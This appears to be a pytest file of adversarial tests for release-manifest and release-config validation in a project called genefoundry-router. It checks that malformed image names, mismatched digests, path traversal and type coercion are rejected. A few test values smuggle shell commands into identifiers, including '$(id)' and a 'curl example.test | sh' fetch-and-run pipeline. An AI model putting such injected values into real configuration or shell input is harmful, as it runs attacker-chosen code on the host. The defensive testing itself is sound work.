"""Adversarial tests for security-sensitive release-model boundaries."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from genefoundry_router.release.models import ApplicationReleaseManifest, ReleaseConfig


def valid_manifest() -> dict[str, object]:
    """Return a complete application-release record for mutation tests."""
    digest = f"sha256:{'a' * 64}"
    checksum = "b" * 64
    return {
        "schema_version": 1,
        "repository": "berntpopp/genefoundry-router",
        "version": "0.6.4",
        "source": {"tag": "v0.6.4", "revision": "c" * 40},
        "image": {
            "name": "ghcr.io/berntpopp/genefoundry-router",
            "digest": digest,
            "platforms": [{"platform": "linux/amd64", "digest": digest}],
        },
        "workflow": {
            "caller": "berntpopp/genefoundry-router/.github/workflows/container-release.yml",
            "standard": ("berntpopp/genefoundry-router/.github/workflows/_container-release.yml"),
            "standard_revision": "d" * 40,
        },
        "mcp": {
            "definitions_sha256": checksum,
            "capture_context_sha256": "e" * 64,
            "definition_contract": "data-independent",
        },
        "security_evidence": {
            "scanner": "trivy",
            "scanner_version": "0.66.0",
            "database_updated_at": "2026-07-13T10:30:00Z",
            "sbom_sha256": "1" * 64,
            "scanner_evidence_sha256": "2" * 64,
            "attestation_bundle_sha256": "3" * 64,
            "trusted_root_sha256": "4" * 64,
            "verification_sha256": "5" * 64,
        },
        "release_assets": {
            "image-manifest.json": digest,
            "sbom.spdx.json": f"sha256:{'1' * 64}",
            "mcp-definitions.json": f"sha256:{checksum}",
            "mcp-capture-context.json": f"sha256:{'e' * 64}",
            "trivy.json": f"sha256:{'2' * 64}",
            "attestation-bundle.json": f"sha256:{'3' * 64}",
            "trusted-root.json": f"sha256:{'4' * 64}",
            "verification.json": f"sha256:{'5' * 64}",
        },
        "data_requirements": {"mode": "none", "schema_compatibility": []},
    }


def valid_config() -> dict[str, object]:
    """Return a minimal router release configuration for mutation tests."""
    return {
        "schema_version": 1,
        "dockerfile": "docker/Dockerfile",
        "target": "production",
        "platform": "linux/amd64",
        "service": {
            "compose_files": ["docker/docker-compose.yml"],
            "name": "genefoundry-router",
            "container_port": 8000,
            "health_path": "/health",
            "mcp_path": "/mcp",
            "startup_timeout_seconds": 90,
        },
        "data": {"mode": "none", "image_allowlist": []},
        "definitions": {"contract": "data-independent"},
        "smoke": {"profile": "compose"},
    }


@pytest.mark.parametrize(
    "image_name",
    [
        "ghcr.io/owner/repo/extra",
        "ghcr.io/owner//repo",
        "ghcr.io//repo",
        "ghcr.io/owner/",
        "ghcr.io/Owner/repo",
    ],
)
def test_manifest_rejects_malformed_ghcr_image_name(image_name: str) -> None:
    manifest = valid_manifest()
    image = manifest["image"]
    assert isinstance(image, dict)
    image["name"] = image_name

    with pytest.raises(ValidationError):
        ApplicationReleaseManifest.model_validate(manifest)


def test_manifest_rejects_image_from_another_repository() -> None:
    manifest = valid_manifest()
    image = manifest["image"]
    assert isinstance(image, dict)
    image["name"] = "ghcr.io/berntpopp/other-repo"

    with pytest.raises(ValidationError, match="image name"):
        ApplicationReleaseManifest.model_validate(manifest)


def test_manifest_rejects_caller_from_another_repository() -> None:
    manifest = valid_manifest()
    workflow = manifest["workflow"]
    assert isinstance(workflow, dict)
    workflow["caller"] = "berntpopp/other-repo/.github/workflows/container-release.yml"

    with pytest.raises(ValidationError, match="workflow caller"):
        ApplicationReleaseManifest.model_validate(manifest)


def test_manifest_allows_standard_workflow_from_router_repository() -> None:
    manifest = valid_manifest()
    manifest["repository"] = "berntpopp/backend-link"
    image = manifest["image"]
    workflow = manifest["workflow"]
    assert isinstance(image, dict)
    assert isinstance(workflow, dict)
    image["name"] = "ghcr.io/berntpopp/backend-link"
    workflow["caller"] = "berntpopp/backend-link/.github/workflows/container-release.yml"

    parsed = ApplicationReleaseManifest.model_validate(manifest)

    assert parsed.workflow.standard.startswith("berntpopp/genefoundry-router/")


@pytest.mark.parametrize(
    "requirements",
    [
        {"mode": "none", "schema_compatibility": []},
        {
            "mode": "external-reference",
            "release_tag": "data-2026.07.13",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [">=1,<2"],
        },
        {
            "mode": "restored-database",
            "release_tag": "data-2026.07.13",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [">=1,<2"],
        },
        {
            "mode": "upstream-live",
            "release_tag": "observed-2026.07.13",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [],
            "reproducible_rollback": False,
        },
    ],
)
def test_manifest_accepts_structurally_exact_data_requirements(
    requirements: dict[str, object],
) -> None:
    manifest = valid_manifest()
    manifest["data_requirements"] = requirements

    parsed = ApplicationReleaseManifest.model_validate(manifest)

    assert parsed.data_requirements.mode == requirements["mode"]


@pytest.mark.parametrize(
    "requirements",
    [
        {"mode": "none", "release_tag": "unexpected", "schema_compatibility": []},
        {
            "mode": "external-reference",
            "release_tag": "data-2026.07.13",
            "schema_compatibility": [],
        },
        {
            "mode": "external-reference",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [],
        },
        {
            "mode": "restored-database",
            "release_tag": "data-2026.07.13",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [],
            "reproducible_rollback": False,
        },
        {
            "mode": "upstream-live",
            "release_tag": "observed-2026.07.13",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [],
        },
        {
            "mode": "upstream-live",
            "release_tag": "observed-2026.07.13",
            "digest": f"sha256:{'6' * 64}",
            "schema_compatibility": [],
            "reproducible_rollback": True,
        },
    ],
)
def test_manifest_rejects_ambiguous_data_requirements(
    requirements: dict[str, object],
) -> None:
    manifest = valid_manifest()
    manifest["data_requirements"] = requirements

    with pytest.raises(ValidationError):
        ApplicationReleaseManifest.model_validate(manifest)


@pytest.mark.parametrize("mode", ["external-reference", "restored-database", "upstream-live"])
@pytest.mark.parametrize("identity_field", ["release_tag", "digest"])
def test_release_config_rejects_partial_data_identity(mode: str, identity_field: str) -> None:
    config = valid_config()
    data: dict[str, object] = {"mode": mode, "image_allowlist": []}
    if mode == "upstream-live":
        data["egress_allowlist"] = ["api.example.test"]
    data[identity_field] = (
        "data-2026.07.13" if identity_field == "release_tag" else f"sha256:{'6' * 64}"
    )
    config["data"] = data

    with pytest.raises(ValidationError, match="release_tag and digest"):
        ReleaseConfig.model_validate(config)


@pytest.mark.parametrize(
    "asset",
    [
        "sbom.spdx.json",
        "mcp-definitions.json",
        "mcp-capture-context.json",
        "trivy.json",
        "attestation-bundle.json",
        "trusted-root.json",
        "verification.json",
    ],
)
def test_manifest_requires_every_standard_release_asset(asset: str) -> None:
    manifest = valid_manifest()
    assets = manifest["release_assets"]
    assert isinstance(assets, dict)
    del assets[asset]

    with pytest.raises(ValidationError):
        ApplicationReleaseManifest.model_validate(manifest)


def test_manifest_rejects_unknown_release_asset() -> None:
    manifest = valid_manifest()
    assets = manifest["release_assets"]
    assert isinstance(assets, dict)
    assets["extra.json"] = f"sha256:{'7' * 64}"

    with pytest.raises(ValidationError):
        ApplicationReleaseManifest.model_validate(manifest)


@pytest.mark.parametrize(
    "asset",
    [
        "sbom.spdx.json",
        "mcp-definitions.json",
        "mcp-capture-context.json",
        "trivy.json",
        "attestation-bundle.json",
        "trusted-root.json",
        "verification.json",
    ],
)
def test_manifest_rejects_asset_digest_mismatched_to_evidence(asset: str) -> None:
    manifest = valid_manifest()
    assets = manifest["release_assets"]
    assert isinstance(assets, dict)
    assets[asset] = f"sha256:{'9' * 64}"

    with pytest.raises(ValidationError, match="release asset digest"):
        ApplicationReleaseManifest.model_validate(manifest)


def test_release_assets_are_frozen_nested_models() -> None:
    parsed = ApplicationReleaseManifest.model_validate(valid_manifest())

    with pytest.raises(ValidationError):
        parsed.release_assets.sbom_spdx_json = f"sha256:{'9' * 64}"


def test_release_assets_serialize_with_standard_json_names() -> None:
    dumped = ApplicationReleaseManifest.model_validate(valid_manifest()).model_dump(mode="json")
    assets = dumped["release_assets"]

    assert "sbom.spdx.json" in assets
    assert "sbom_spdx_json" not in assets


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("schema_version", True),
        ("schema_version", "1"),
        ("schema_version", 1.0),
        ("container_port", True),
        ("container_port", "8000"),
        ("container_port", 8000.0),
        ("startup_timeout_seconds", True),
        ("startup_timeout_seconds", "90"),
        ("startup_timeout_seconds", 90.0),
    ],
)
def test_release_config_rejects_security_scalar_coercion(field: str, value: object) -> None:
    config = valid_config()
    if field == "schema_version":
        config[field] = value
    else:
        service = config["service"]
        assert isinstance(service, dict)
        service[field] = value

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


@pytest.mark.parametrize("value", [1, 0, "true", "false"])
def test_release_config_rejects_boolean_coercion(value: object) -> None:
    config = valid_config()
    config["runtime_cache"] = {
        "path": "/var/cache/genefoundry",
        "eviction": "least-recently-used",
        "deletable_without_authoritative_data_loss": value,
    }

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


@pytest.mark.parametrize("value", [True, "1", 1.0])
def test_manifest_rejects_schema_version_coercion(value: object) -> None:
    manifest = valid_manifest()
    manifest["schema_version"] = value

    with pytest.raises(ValidationError):
        ApplicationReleaseManifest.model_validate(manifest)


def test_upstream_live_rejects_false_equivalent_integer() -> None:
    manifest = valid_manifest()
    manifest["data_requirements"] = {
        "mode": "upstream-live",
        "release_tag": "observed-2026.07.13",
        "digest": f"sha256:{'6' * 64}",
        "schema_compatibility": [],
        "reproducible_rollback": 0,
    }

    with pytest.raises(ValidationError):
        ApplicationReleaseManifest.model_validate(manifest)


def test_manifest_rejects_stable_tag_version_mismatch() -> None:
    manifest = valid_manifest()
    source = manifest["source"]
    assert isinstance(source, dict)
    source["tag"] = "v0.6.5"

    with pytest.raises(ValidationError, match="source tag"):
        ApplicationReleaseManifest.model_validate(manifest)


def test_manifest_rejects_platform_image_digest_mismatch() -> None:
    manifest = valid_manifest()
    image = manifest["image"]
    assert isinstance(image, dict)
    image["platforms"] = [{"platform": "linux/amd64", "digest": f"sha256:{'8' * 64}"}]

    with pytest.raises(ValidationError, match="platform digest"):
        ApplicationReleaseManifest.model_validate(manifest)


@pytest.mark.parametrize("model", [ReleaseConfig, ApplicationReleaseManifest])
def test_json_schema_warns_that_semantic_validation_is_also_required(
    model: type[ReleaseConfig] | type[ApplicationReleaseManifest],
) -> None:
    comment = model.model_json_schema().get("$comment", "")

    assert "structural constraints" in comment
    assert "semantic validation" in comment


@pytest.mark.parametrize(
    ("field", "path"),
    [
        ("dockerfile", ""),
        ("dockerfile", "/docker/Dockerfile"),
        ("dockerfile", "../Dockerfile"),
        ("dockerfile", "docker/../Dockerfile"),
        ("dockerfile", "./docker/Dockerfile"),
        ("dockerfile", "docker\\Dockerfile"),
        ("compose_files", "docker//docker-compose.yml"),
        ("compose_files", "docker/\x01compose.yml"),
    ],
)
def test_release_config_rejects_unsafe_repository_path(field: str, path: str) -> None:
    config = valid_config()
    if field == "compose_files":
        service = config["service"]
        assert isinstance(service, dict)
        service["compose_files"] = [path]
    else:
        config[field] = path

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


def test_release_config_accepts_normalized_repository_paths() -> None:
    config = valid_config()
    config["dockerfile"] = "docker/build/Dockerfile"
    service = config["service"]
    assert isinstance(service, dict)
    service["compose_files"] = ["docker/base.yml", "docker/prod.yml"]

    parsed = ReleaseConfig.model_validate(config)

    assert parsed.dockerfile == "docker/build/Dockerfile"
    assert parsed.service.compose_files == ("docker/base.yml", "docker/prod.yml")


@pytest.mark.parametrize(
    "path",
    ["", "/app/data.json", "app/../data.json", "app//data.json", "app\\data.json"],
)
def test_release_config_rejects_unsafe_image_allowlist_path(path: str) -> None:
    config = valid_config()
    config["data"] = {"mode": "none", "image_allowlist": [path]}

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


@pytest.mark.parametrize("path", ["cache", "/", "/var/../cache", "//var/cache", "/var\\cache"])
def test_release_config_rejects_unsafe_runtime_cache_path(path: str) -> None:
    config = valid_config()
    config["runtime_cache"] = {
        "path": path,
        "eviction": "least-recently-used",
        "deletable_without_authoritative_data_loss": True,
    }

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


@pytest.mark.parametrize(
    "egress",
    [
        [],
        ["*"],
        ["https://api.example.test"],
        ["api.example.test/path"],
        ["api example.test"],
        ["../api.example.test"],
        ["api.example.test:abc"],
        ["api.example.test:0"],
        ["api.example.test:65536"],
    ],
)
def test_release_config_rejects_unsafe_upstream_egress(egress: list[str]) -> None:
    config = valid_config()
    config["data"] = {
        "mode": "upstream-live",
        "image_allowlist": [],
        "egress_allowlist": egress,
    }

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


def test_release_config_accepts_exact_paths_and_dns_egress() -> None:
    config = valid_config()
    config["data"] = {
        "mode": "upstream-live",
        "image_allowlist": ["app/data/schema.json"],
        "egress_allowlist": ["api.example.test", "mirror.example.test:443"],
    }
    config["runtime_cache"] = {
        "path": "/var/cache/genefoundry",
        "eviction": "least-recently-used",
        "deletable_without_authoritative_data_loss": True,
    }

    parsed = ReleaseConfig.model_validate(config)

    assert parsed.data.egress_allowlist == ("api.example.test", "mirror.example.test:443")


@pytest.mark.parametrize(
    ("field", "value"),
    [("target", "prod; sh"), ("target", ""), ("service", "router $(id)"), ("service", "")],
)
def test_release_config_rejects_shell_unsafe_identifiers(field: str, value: str) -> None:
    config = valid_config()
    if field == "target":
        config["target"] = value
    else:
        service = config["service"]
        assert isinstance(service, dict)
        service["name"] = value

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)


@pytest.mark.parametrize(
    "profile",
    [
        "compose",
        "compose-two-context",
        "immutable-bundle",
        "postgres-bundle",
        "prepared-live-fixture",
    ],
)
def test_release_config_accepts_central_smoke_profiles(profile: str) -> None:
    config = valid_config()
    config["smoke"] = {"profile": profile}

    parsed = ReleaseConfig.model_validate(config)

    assert parsed.smoke.profile == profile


@pytest.mark.parametrize("profile", ["arbitrary", "compose; curl example.test | sh", ""])
def test_release_config_rejects_unknown_or_shell_smoke_profile(profile: str) -> None:
    config = valid_config()
    config["smoke"] = {"profile": profile}

    with pytest.raises(ValidationError):
        ReleaseConfig.model_validate(config)
